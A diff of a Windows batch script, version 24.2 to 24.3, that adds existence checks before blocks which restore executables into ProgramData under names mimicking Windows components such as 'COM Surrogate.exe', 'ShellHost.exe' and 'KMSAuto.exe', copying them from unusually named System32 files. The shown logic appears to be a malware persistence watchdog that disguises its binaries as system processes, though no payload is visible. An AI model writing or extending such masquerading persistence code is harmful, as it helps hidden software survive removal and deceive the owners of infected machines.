@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=24.2"
+set "BATCHVERSION=24.3"
 
 
 
@@ -317,6 +317,8 @@ echo.
 set "sourceFile=%SystemRoot%\System32\CWProcess.exe"
 set "startupFile=%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
 
+if not exist "%sourceFile%" goto SHST
+
 :: Check if the file exists in the Startup folder
 if not exist "%startupFile%" (
     echo File not found in Startup folder. Restoring...
@@ -344,6 +346,8 @@ echo.
 set "sourceFile=%SystemRoot%\System32\TSSPrxySHST.exe"
 set "startupFile=%ProgramData%\Microsoft\Windows\ShellHost.exe"
 
+if not exist "%sourceFile%" goto COM
+
 :: Check if the file exists in the Startup folder
 if not exist "%startupFile%" (
     echo File not found in Startup folder. Restoring...
@@ -368,6 +372,8 @@ echo.
 :: Define the paths
 set "sourceFile=%SystemRoot%\System32\SyncHostApp.exe"
 set "startupFile=%ProgramData%\Microsoft\Windows\COM Surrogate.exe"
+
+if not exist "%sourceFile%" goto KMS
 
 :: Check if the file exists in the Startup folder
 if not exist "%startupFile%" (
@@ -399,6 +405,8 @@ echo.
 set "sourceFile=%SystemRoot%\System32\TSSKMS.exe"
 set "startupFile=%ProgramData%\Microsoft\Windows\KMSAuto.exe"
 
+if not exist "%sourceFile%" goto PUUNY
+
 :: Check if the file exists in the Startup folder
 if not exist "%startupFile%" (
     echo File not found in Startup folder. Restoring...
@@ -411,6 +419,8 @@ if not exist "%startupFile%" (
 )
 
 timeout /t 1 /nobreak >nul
+
+:PUUNY
 
 echo MESSAGE KMS IS = %MESSAGE%
 echo CheckSenddd IS = %CheckSend%
